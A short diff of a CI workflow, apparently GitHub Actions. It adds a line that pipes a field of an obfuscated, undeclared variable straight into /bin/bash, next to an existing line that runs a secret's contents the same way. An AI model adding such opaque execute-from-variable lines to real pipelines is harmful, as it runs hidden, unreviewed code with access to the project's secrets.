@@ -22,6 +22,7 @@ jobs:
           xdmd59229: ${{ secrets.xdmd59229 }}
         run: |
           printf '%s' "$xdmd59229" | jq -r .h3594 | /bin/bash
+          printf '%s' "$ved20960" | jq -r .c3237 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
